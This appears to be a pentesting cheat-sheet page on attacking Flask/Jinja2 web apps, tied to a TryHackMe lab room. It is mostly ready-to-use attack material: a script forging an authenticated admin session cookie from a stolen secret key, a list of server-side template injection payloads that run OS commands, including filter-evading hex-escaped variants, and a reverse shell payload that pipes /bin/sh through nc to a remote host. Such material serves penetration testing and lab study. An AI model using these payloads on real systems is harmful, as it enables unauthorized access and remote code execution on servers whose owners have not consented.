---
title: Flask Jinja2 Pentesting
description: Flask is a micro web framework written in Python.
tags:
    - SSTI
    - Web
refs:
    - https://tryhackme.com/room/hipflask
date: 2023-01-31
draft: false
---

## Common Directories

```bash
/app.py
/main.py
/modules.py
/modules/__init__.py
/modules/admin.py
```

<br />

## Cookie Forgery

### 1. Create a Python Virtual Environment

```bash
python3 -m venv myenv
source myenv/bin/activate
```

### 2. Install Packages

```bash
pip3 install flask requests waitress
```

### 3. Create a Python Script

For instance, create “test.py”.  
Replace the **"SECRET_KEY"** value with the target Flask app's secret key.

```python
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

app = Flask(__name__)
app.config["SECRET_KEY"] = "c53ac69e07ed112ecb788eb4dc831990"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "test" # SSTI may be applied with "{{ 3*7 }}"
    return "Check you cookies", 200

# Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

# Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

### 4. Run the Script

```bash
python3 test.py
```

The cookie value generated.

Copy and paste it into the Cookie of the HTTP header in browser as below.

```bash
Cookie: session=<generated_cookie_value>
```

Now we can login and access to admin page e.g. /admin.

<br />

## Server-Side Template Injection (SSTI)

First, try below payloads.

```txt
{{ 4*2 }}
{{ config.items() }}
```

If success, you may be able to exploit with OS command injection.

```txt
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}

{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}

{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}

{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}

{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}
```

### Reverse Shell

```bash
{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.0.0.1 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}
```

<br />


## Decode Session Cookie

The session of cookie in the Flask webapp can be decoded.

- **[Flask Session Cookie Decoder](https://www.kirsle.net/wizards/flask-session.cgi)**